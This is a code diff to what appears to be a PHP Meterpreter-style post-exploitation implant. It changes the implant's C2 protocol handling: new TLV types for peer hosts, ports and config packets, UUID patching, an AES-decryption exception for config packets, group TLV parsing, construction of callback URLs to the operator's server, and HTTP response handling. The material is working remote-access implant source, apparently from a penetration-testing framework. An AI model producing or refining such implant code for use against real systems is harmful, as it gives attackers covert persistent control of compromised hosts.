@@ -149,6 +149,7 @@ define("ENC_AES256", 1);
 
 define("PACKET_TYPE_REQUEST",         0);
 define("PACKET_TYPE_RESPONSE",        1);
+define("PACKET_TYPE_CONFIG",          2);
 define("PACKET_TYPE_PLAIN_REQUEST",  10);
 define("PACKET_TYPE_PLAIN_RESPONSE", 11);
 
@@ -213,6 +214,7 @@ define("TLV_TYPE_CHANNEL_TYPE",        TLV_META_TYPE_STRING |  51);
 define("TLV_TYPE_CHANNEL_DATA",        TLV_META_TYPE_RAW    |  52);
 define("TLV_TYPE_CHANNEL_DATA_GROUP",  TLV_META_TYPE_GROUP  |  53);
 define("TLV_TYPE_CHANNEL_CLASS",       TLV_META_TYPE_UINT   |  54);
+define("TLV_TYPE_CHANNEL_PARENTID",    TLV_META_TYPE_UINT   |  55);
 
 define("TLV_TYPE_SEEK_WHENCE",         TLV_META_TYPE_UINT   |  70);
 define("TLV_TYPE_SEEK_OFFSET",         TLV_META_TYPE_UINT   |  71);
@@ -234,9 +236,16 @@ define("TLV_TYPE_SYM_KEY_TYPE",        TLV_META_TYPE_UINT   | 551);
 define("TLV_TYPE_SYM_KEY",             TLV_META_TYPE_RAW    | 552);
 define("TLV_TYPE_ENC_SYM_KEY",         TLV_META_TYPE_RAW    | 553);
 
+define("TLV_TYPE_PEER_HOST",           TLV_META_TYPE_STRING | 1500);
+define("TLV_TYPE_PEER_PORT",           TLV_META_TYPE_UINT   | 1501);
+define("TLV_TYPE_LOCAL_HOST",          TLV_META_TYPE_STRING | 1502);
+define("TLV_TYPE_LOCAL_PORT",          TLV_META_TYPE_UINT   | 1503);
+
 # C2/Transport configuration
 define("TLV_TYPE_SESSION_EXPIRY",      TLV_META_TYPE_UINT   | 700);
+define("TLV_TYPE_EXITFUNC",            TLV_META_TYPE_UINT   | 701);
 define("TLV_TYPE_DEBUG_LOG",           TLV_META_TYPE_STRING | 702);
+define("TLV_TYPE_EXTENSION",           TLV_META_TYPE_GROUP  | 703);
 define("TLV_TYPE_C2",                  TLV_META_TYPE_GROUP  | 704);
 define("TLV_TYPE_C2_COMM_TIMEOUT",     TLV_META_TYPE_UINT   | 705);
 define("TLV_TYPE_C2_RETRY_TOTAL",      TLV_META_TYPE_UINT   | 706);
@@ -761,12 +770,10 @@ if (!function_exists('core_patch_uuid')) {
     $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
     if ($tlv == null) { return ERROR_FAILURE; }
     $new_uuid = $tlv['value'];
+    # Like metsrv request_core_patch_uuid: only swap the UUID. The URL is
+    # rebuilt from the (untouched) base each request, so the base path/LURI
+    # and any cookie/header/get-param placement stay intact.
     $transport['c2_uuid'] = $new_uuid;
-    $parts = parse_url($transport['url']);
-    if (isset($parts['scheme']) && isset($parts['host'])) {
-      $port = isset($parts['port']) ? ':' . $parts['port'] : '';
-      $transport['url'] = $parts['scheme'] . '://' . $parts['host'] . $port . '/' . $new_uuid;
-    }
     return ERROR_SUCCESS;
   }
 }
@@ -1046,7 +1053,12 @@ function supports_aes() {
 function decrypt_packet($raw) {
   $len_array = unpack("Nlen", substr($raw, 20, 4));
   $encrypt_flags = $len_array['len'];
-  if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null) {
+  $type_array = unpack("Ntype", substr($raw, 28, 4));
+  $pkt_type = $type_array['type'];
+  # Like python: config packets are never AES-encrypted even when a key is
+  # set (the key arrives in a config packet), so don't try to decrypt them.
+  if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null
+      && $pkt_type != PACKET_TYPE_CONFIG) {
     $tlv = substr($raw, 24);
     $dec = openssl_decrypt(substr($tlv, 24), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, substr($tlv, 8, 16));
     return pack("N", strlen($dec) + 8) . substr($tlv, 4, 4) . $dec;
@@ -1223,6 +1235,12 @@ function tlv_unpack($raw_tlv) {
     $tlv = unpack("Nlen/Ntype", $raw_tlv);
     $tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8);
   }
+  elseif (($type & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
+    # A group's value is the raw concatenation of its sub-TLVs; callers
+    # (packet_get_tlv_raw / parse_c2_verb_config) parse into it.
+    $tlv = unpack("Nlen/Ntype", $raw_tlv);
+    $tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8);
+  }
   else {
     my_print("Wtf type is this? $type");
     $tlv = null;
@@ -1282,6 +1300,12 @@ function packet_enum_tlvs_raw($raw, $type) {
   return $all;
 }
 
+# Like packet_enum_tlvs_raw but starts at offset 8 to skip the packet
+# [length][type] header (use on full packets, not header-less group values).
+function packet_enum_tlvs($pkt, $type) {
+  return packet_enum_tlvs_raw(substr($pkt, 8), $type);
+}
+
 function parse_c2_verb_config($group_bytes) {
   $config = array();
   $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_URI);
@@ -1310,23 +1334,23 @@ function parse_config_block($raw) {
 
   $config = array();
 
-  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_UUID);
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_UUID);
   $config['uuid'] = ($tlv != null) ? $tlv['value'] : str_repeat("\x00", 16);
 
-  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_SESSION_GUID);
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_SESSION_GUID);
   $config['session_guid'] = ($tlv != null) ? $tlv['value'] : str_repeat("\x00", 16);
 
-  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_SESSION_EXPIRY);
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_SESSION_EXPIRY);
   $config['session_expiry'] = ($tlv != null) ? $tlv['value'] : 604800;
 
-  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_DEBUG_LOG);
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_DEBUG_LOG);
   $config['debug_log'] = ($tlv != null) ? $tlv['value'] : null;
 
-  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_SYM_KEY);
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_SYM_KEY);
   $config['sym_key'] = ($tlv != null) ? $tlv['value'] : null;
 
   $transports = array();
-  foreach (packet_enum_tlvs_raw($config_bytes, TLV_TYPE_C2) as $c2_tlv) {
+  foreach (packet_enum_tlvs($config_bytes, TLV_TYPE_C2) as $c2_tlv) {
     $c2_bytes = $c2_tlv['value'];
 
     $t = array();
@@ -2026,22 +2050,31 @@ function http_transport_uuid($transport) {
 }
 
 function http_build_profile_url($transport, $profile) {
-  $base_url = $transport['url'];
-  if ($profile == null || !isset($profile['uri']) || $profile['uri'] == null) {
-    return $base_url;
-  }
-  $parsed = parse_url($base_url);
-  $url = $parsed['scheme'] . '://' . $parsed['host'];
-  if (isset($parsed['port'])) { $url .= ':' . $parsed['port']; }
-  $uri = $profile['uri'];
-  if ($uri[0] != '/') { $uri = '/' . $uri; }
-  $url .= $uri;
+  # Always rebuild from the (untouched) base + current UUID each request,
+  # like metsrv generate_uri, so a patched UUID is honoured without mutating
+  # $transport['url'].
+  $parsed = parse_url($transport['url']);
+  $base = $parsed['scheme'] . '://' . $parsed['host'];
+  if (isset($parsed['port'])) { $base .= ':' . $parsed['port']; }
 
-  if (isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
-    $uuid = http_transport_uuid($transport);
+  $uri = '';
+  if ($profile != null && isset($profile['uri']) && $profile['uri'] != null) {
+    $uri = $profile['uri'];
+    if ($uri[0] != '/') { $uri = '/' . $uri; }
+  }
+  $url = $base . $uri;
+
+  $uuid = http_transport_uuid($transport);
+  if ($profile != null && isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
     if (strlen($uuid) > 0) {
       $sep = (strpos($url, '?') !== false) ? '&' : '?';
       $url .= $sep . $profile['uuid_get'] . '=' . $uuid;
+    }
+  } elseif ($profile == null
+            || (empty($profile['uuid_header']) && empty($profile['uuid_cookie']))) {
+    # No param/header/cookie placement => carry the id in the URI path.
+    if (strlen($uuid) > 0) {
+      $url = rtrim($url, '/') . '/' . $uuid;
     }
   }
   return $url;
@@ -2117,7 +2150,9 @@ function http_get_packet($transport) {
     if ($start > 0 || $profile['suffix_skip'] > 0) {
       $raw = substr($raw, $start, $end - $start);
     }
-    $raw = c2_decode($raw, $profile['enc']);
+    # NOTE: $profile['enc'] is the client metadata/id (request-side)
+    # encoding; it must NOT decode the response. The response transform is
+    # the server `output` (conveyed via prefix/suffix skip above).
   }
 
   return $raw;
